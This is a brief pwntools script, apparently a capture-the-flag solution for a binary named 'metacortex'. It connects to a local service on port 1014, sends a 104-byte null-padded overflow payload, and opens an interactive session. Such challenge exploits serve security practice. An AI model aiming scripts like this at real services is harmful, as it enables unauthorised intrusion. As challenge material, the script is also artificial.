from pwn import *  # NOQA

# p = process('./metacortex')
p = remote('localhost', 1014)
# gdb.attach(p)

payload = b'0\x00'
while len(payload) < 104:
    payload += b'\x00'

payload += b'\n'

p.send(payload)

p.interactive()
